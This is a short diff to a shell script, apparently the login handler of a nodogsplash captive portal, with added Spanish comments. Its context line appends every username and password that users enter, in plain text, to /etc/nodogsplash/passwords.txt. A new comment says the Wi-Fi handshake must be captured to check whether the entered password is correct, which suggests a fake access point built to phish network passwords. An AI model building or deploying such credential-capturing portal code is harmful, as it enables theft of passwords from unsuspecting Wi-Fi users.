@@ -9,6 +9,13 @@ case "$METHOD" in
     PASSWORD="$4"
       # Guardamos a un fichero los valores USERNAME y PASSWORD.
       echo 3600 0 0
+      
+      #
+      # Necesario capturar el handsahke para compriabar que la contraseña que meta el usuario sea la correcta.
+      #
+      
+      
+      
       echo "$3 $4" >> /etc/nodogsplash/passwords.txt
       exit 0
 
